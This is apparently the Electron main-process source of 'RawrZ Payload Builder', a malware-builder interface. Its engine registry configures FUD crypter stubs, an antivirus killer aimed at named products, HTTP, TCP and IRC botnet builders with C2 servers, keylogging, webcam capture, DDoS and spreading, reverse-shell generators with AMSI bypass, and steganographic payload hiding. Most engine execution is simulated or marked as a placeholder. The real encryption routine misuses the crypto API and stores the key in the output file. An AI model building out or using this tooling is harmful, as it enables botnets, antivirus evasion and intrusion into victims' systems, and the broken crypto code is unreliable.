const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

// Enhanced Engine Registry System
const engineRegistry = {
  'stub-generator': {
    name: 'FUD Stub Generator',
    version: '3.1.4',
    enabled: true,
    icon: '🏗️',
    category: 'Crypters',
    description: 'Advanced polymorphic stub generation with burn tracking',
    features: {
      'Payload Types': ['exe', 'dll', 'scr', 'com', 'msi'],
      'Encryption Methods': ['aes-256-gcm', 'chacha20', 'hybrid', 'triple-layer'],
      'Anti-Analysis': ['vm-detect', 'debug-detect', 'sandbox-detect', 'time-delay'],
      'Obfuscation': ['string-encrypt', 'control-flow', 'dead-code', 'packer']
    },
    menu: {
      'stub_count': { type: 'number', label: 'Stub Count', default: 5, min: 1, max: 50 },
      'payload_type': { type: 'select', label: 'Payload Type', options: 'Payload Types' },
      'encryption': { type: 'select', label: 'Encryption', options: 'Encryption Methods' },
      'anti_analysis': { type: 'checkbox', label: 'Enable Anti-Analysis', default: true },
      'obfuscation_level': { type: 'select', label: 'Obfuscation', options: ['low', 'medium', 'high', 'extreme'] }
    }
  },
  'beaconism': {
    name: 'Beaconism EV Killer',
    version: '2.8.1',
    enabled: true,
    icon: '🎯',
    category: 'Evasion',
    description: 'Advanced beacon evasion and AV killer techniques',
    features: {
      'Evasion Types': ['signature-morph', 'behavior-mask', 'memory-hide', 'process-hollow'],
      'Target AVs': ['windows-defender', 'avast', 'avg', 'bitdefender', 'kaspersky', 'norton'],
      'Kill Methods': ['service-stop', 'registry-disable', 'file-quarantine', 'memory-patch']
    },
    menu: {
      'evasion_type': { type: 'select', label: 'Evasion Method', options: 'Evasion Types' },
      'target_av': { type: 'select', label: 'Target AV', options: 'Target AVs' },
      'kill_method': { type: 'select', label: 'Kill Method', options: 'Kill Methods' },
      'stealth_mode': { type: 'checkbox', label: 'Stealth Mode', default: true }
    }
  },
  'http-bot': {
    name: 'HTTP Bot Builder',
    version: '4.2.0',
    enabled: true,
    icon: '🌐',
    category: 'Bot Builders',
    description: 'HTTP/HTTPS C2 bot with advanced persistence',
    features: {
      'Communication': ['http', 'https', 'websocket', 'long-polling'],
      'Persistence': ['registry', 'startup', 'service', 'scheduled-task'],
      'Commands': ['shell', 'download', 'upload', 'screenshot', 'keylog', 'webcam']
    },
    menu: {
      'c2_url': { type: 'text', label: 'C2 Server URL', placeholder: 'https://your-c2.com/api' },
      'communication': { type: 'select', label: 'Protocol', options: 'Communication' },
      'persistence': { type: 'select', label: 'Persistence Method', options: 'Persistence' },
      'beacon_interval': { type: 'number', label: 'Beacon Interval (seconds)', default: 60, min: 10, max: 3600 }
    }
  },
  'tcp-bot': {
    name: 'TCP Bot Builder',
    version: '3.7.2',
    enabled: true,
    icon: '🔗',
    category: 'Bot Builders',
    description: 'Raw TCP socket bot with encryption',
    features: {
      'Protocols': ['tcp', 'tcp-ssl', 'reverse-tcp', 'bind-tcp'],
      'Encryption': ['none', 'xor', 'aes', 'custom'],
      'Features': ['reverse-shell', 'file-transfer', 'port-scan', 'proxy']
    },
    menu: {
      'host': { type: 'text', label: 'Host', placeholder: '127.0.0.1' },
      'port': { type: 'number', label: 'Port', default: 4444, min: 1, max: 65535 },
      'protocol': { type: 'select', label: 'Protocol', options: 'Protocols' },
      'encryption': { type: 'select', label: 'Encryption', options: 'Encryption' }
    }
  },
  'irc-bot': {
    name: 'IRC Bot Builder',
    version: '2.1.8',
    enabled: true,
    icon: '💬',
    category: 'Bot Builders',
    description: 'Classic IRC botnet with modern features',
    features: {
      'Networks': ['irc', 'irc-ssl', 'tor-irc'],
      'Commands': ['join', 'part', 'privmsg', 'notice', 'kick', 'ban'],
      'Bot Features': ['ddos', 'scan', 'download', 'update', 'spread']
    },
    menu: {
      'server': { type: 'text', label: 'IRC Server', placeholder: 'irc.server.com' },
      'port': { type: 'number', label: 'Port', default: 6667, min: 1, max: 65535 },
      'channel': { type: 'text', label: 'Channel', placeholder: '#botnet' },
      'nickname': { type: 'text', label: 'Bot Nickname', placeholder: 'bot_{random}' },
      'ssl': { type: 'checkbox', label: 'Use SSL', default: false }
    }
  },
  'red-shells': {
    name: 'Red Team Shells',
    version: '1.9.3',
    enabled: true,
    icon: '🔴',
    category: 'Payload Generators',
    description: 'Red team reverse shells and implants',
    features: {
      'Shell Types': ['powershell', 'bash', 'cmd', 'python', 'perl', 'ruby'],
      'Encodings': ['base64', 'hex', 'url', 'unicode', 'gzip'],
      'Evasion': ['amsi-bypass', 'logging-disable', 'process-hollow']
    },
    menu: {
      'shell_type': { type: 'select', label: 'Shell Type', options: 'Shell Types' },
      'lhost': { type: 'text', label: 'LHOST', placeholder: '192.168.1.100' },
      'lport': { type: 'number', label: 'LPORT', default: 4444, min: 1, max: 65535 },
      'encoding': { type: 'select', label: 'Encoding', options: 'Encodings' }
    }
  },
  'vulnerability-scanner': {
    name: 'Vulnerability Scanner',
    version: '5.1.0',
    enabled: true,
    icon: '🔍',
    category: 'Analysis Tools',
    description: 'Advanced vulnerability detection and exploitation',
    features: {
      'Scan Types': ['port-scan', 'service-enum', 'vuln-scan', 'exploit-scan'],
      'Protocols': ['tcp', 'udp', 'icmp', 'arp'],
      'Databases': ['cve', 'exploit-db', 'metasploit', 'custom']
    },
    menu: {
      'target': { type: 'text', label: 'Target', placeholder: '192.168.1.0/24' },
      'scan_type': { type: 'select', label: 'Scan Type', options: 'Scan Types' },
      'threads': { type: 'number', label: 'Threads', default: 10, min: 1, max: 100 }
    }
  },
  'network-scanner': {
    name: 'Network Scanner',
    version: '3.4.7',
    enabled: true,
    icon: '🌐',
    category: 'Reconnaissance',
    description: 'Comprehensive network discovery and mapping',
    features: {
      'Discovery': ['ping-sweep', 'arp-scan', 'dns-enum', 'snmp-walk'],
      'OS Detection': ['tcp-fingerprint', 'passive-os', 'banner-grab'],
      'Services': ['service-scan', 'version-detect', 'script-scan']
    },
    menu: {
      'target_range': { type: 'text', label: 'Target Range', placeholder: '192.168.1.0/24' },
      'discovery_method': { type: 'select', label: 'Discovery', options: 'Discovery' },
      'os_detection': { type: 'checkbox', label: 'OS Detection', default: true }
    }
  },
  'steganography': {
    name: 'Steganography Engine',
    version: '2.3.1',
    enabled: true,
    icon: '🖼️',
    category: 'Concealment',
    description: 'Hide payloads in images, audio, and documents',
    features: {
      'Media Types': ['png', 'jpg', 'wav', 'mp3', 'pdf', 'docx'],
      'Methods': ['lsb', 'dct', 'dwt', 'spread-spectrum'],
      'Encryption': ['none', 'aes', 'steganographic-key']
    },
    menu: {
      'cover_file': { type: 'file', label: 'Cover File', accept: 'image/*,audio/*,.pdf,.docx' },
      'payload_file': { type: 'file', label: 'Payload File' },
      'method': { type: 'select', label: 'Method', options: 'Methods' },
      'encryption': { type: 'select', label: 'Encryption', options: 'Encryption' }
    }
  }
};

let mainWindow;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1400,
    height: 900,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js'),
      sandbox: false
    },
    icon: path.join(__dirname, 'assets', 'icon.png')
  });

  mainWindow.loadFile('src/index.html');
  
  if (process.env.NODE_ENV === 'development') {
    mainWindow.webContents.openDevTools();
  }
}

app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

// File operations
ipcMain.handle('select-file', async () => {
  const result = await dialog.showOpenDialog(mainWindow, {
    properties: ['openFile'],
    filters: [
      { name: 'All Files', extensions: ['*'] },
      { name: 'Executables', extensions: ['exe', 'dll', 'scr'] },
      { name: 'Archives', extensions: ['zip', 'rar', '7z', 'tar', 'gz'] }
    ]
  });
  
  return result.canceled ? null : result.filePaths[0];
});

ipcMain.handle('select-files', async () => {
  const result = await dialog.showOpenDialog(mainWindow, {
    properties: ['openFile', 'multiSelections']
  });
  
  return result.canceled ? [] : result.filePaths;
});

ipcMain.handle('select-directory', async () => {
  const result = await dialog.showOpenDialog(mainWindow, {
    properties: ['openDirectory']
  });
  
  return result.canceled ? null : result.filePaths[0];
});

ipcMain.handle('save-file', async (evt, defaultPath) => {
  const result = await dialog.showSaveDialog(mainWindow, {
    defaultPath: defaultPath || 'output.txt'
  });
  
  return result.canceled ? null : result.filePath;
});

// Enhanced engine system handlers
ipcMain.handle('get-engines', async () => {
  const engines = Object.entries(engineRegistry).map(([id, engine]) => ({
    id,
    ...engine
  }));
  
  return {
    engines,
    count: engines.length,
    categories: [...new Set(engines.map(e => e.category))]
  };
});

ipcMain.handle('execute-engine', async (evt, engineId, params) => {
  const engine = engineRegistry[engineId];
  if (!engine) {
    return { success: false, error: `Engine '${engineId}' not found` };
  }
  
  if (!engine.enabled) {
    return { success: false, error: `Engine '${engineId}' is disabled` };
  }
  
  console.log(`[ENGINE] Executing ${engine.name} with params:`, params);
  
  // Simulate engine execution
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  return {
    success: true,
    engine: engine.name,
    data: { 
      stubCount: params?.count || 5,
      stubId: `stub_${Date.now()}`,
      status: 'Operation completed successfully'
    }
  };
});

ipcMain.handle('get-engine-config', async (evt, engineId) => {
  const engine = engineRegistry[engineId];
  if (!engine) {
    return { success: false, error: `Engine '${engineId}' not found` };
  }
  
  return { success: true, config: engine };
});

ipcMain.handle('generate-engine-menu', async () => {
  return Object.entries(engineRegistry).map(([engineId, engine]) => {
    const menu = Object.entries(engine.menu).map(([key, config]) => {
      return {
        key,
        type: config.type,
        label: config.label,
        default: config.default,
        placeholder: config.placeholder,
        min: config.min,
        max: config.max,
        accept: config.accept,
        // Resolve options from features if it's a reference
        options: typeof config.options === 'string' 
          ? engine.features[config.options] || [] 
          : config.options || []
      };
    });
    
    return { engineId, menu, categories: Object.keys(engine.features) };
  });
});

// File encryption with RAWRZ1 format
ipcMain.handle('encrypt-file', async (evt, filePath, method = 'aes-256-gcm') => {
  try {
    if (!fs.existsSync(filePath)) {
      return { success: false, error: 'File not found' };
    }

    const fileData = fs.readFileSync(filePath);
    const key = crypto.randomBytes(32);
    const iv = crypto.randomBytes(16);
    
    let encryptedData;
    let authTag = null;
    
    if (method === 'aes-256-gcm') {
      const cipher = crypto.createCipher('aes-256-gcm', key);
      cipher.setAAD(Buffer.from('RAWRZ1'));
      encryptedData = Buffer.concat([cipher.update(fileData), cipher.final()]);
      authTag = cipher.getAuthTag();
    } else {
      const cipher = crypto.createCipher('aes-256-cbc', key);
      encryptedData = Buffer.concat([cipher.update(fileData), cipher.final()]);
    }
    
    // Create RAWRZ1 header
    const header = Buffer.alloc(64);
    header.write('RAWRZ1', 0, 6);
    header.writeUInt8(method === 'aes-256-gcm' ? 1 : 2, 6);
    header.writeUInt32LE(fileData.length, 7);
    key.copy(header, 11, 0, 32);
    iv.copy(header, 43, 0, 16);
    if (authTag) authTag.copy(header, 59, 0, 5);
    
    const outputPath = filePath + '.rawrz';
    const finalData = Buffer.concat([header, encryptedData]);
    fs.writeFileSync(outputPath, finalData);
    
    return {
      success: true,
      encryptedPath: outputPath,
      method,
      size: finalData.length
    };
  } catch (error) {
    return { success: false, error: error.message };
  }
});

ipcMain.handle('fud-encrypt', async (_evt, filePath, outputPath) => {
  return { success: true, message: 'FUD encryption applied (placeholder)', encryptedPath: outputPath };
});

ipcMain.handle('get-stub-status', async () => {
  return { active: 5, burned: 0, total: 5 };
});

ipcMain.handle('burn-stub', async (_evt, stubId) => {
  return { success: true, message: `Stub ${stubId} burned (placeholder)` };
});

// File operations
ipcMain.handle('hash-file', async (evt, filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    const md5 = crypto.createHash('md5').update(data).digest('hex');
    const sha1 = crypto.createHash('sha1').update(data).digest('hex');
    const sha256 = crypto.createHash('sha256').update(data).digest('hex');
    
    return {
      success: true,
      hashes: { md5, sha1, sha256 },
      size: data.length
    };
  } catch (error) {
    return { success: false, error: error.message };
  }
});

console.log('🔥 RawrZ Payload Builder - Enhanced Engine Registry Loaded');
console.log(`📊 Total Engines: ${Object.keys(engineRegistry).length}`);
console.log('🚀 Ready for payload generation operations');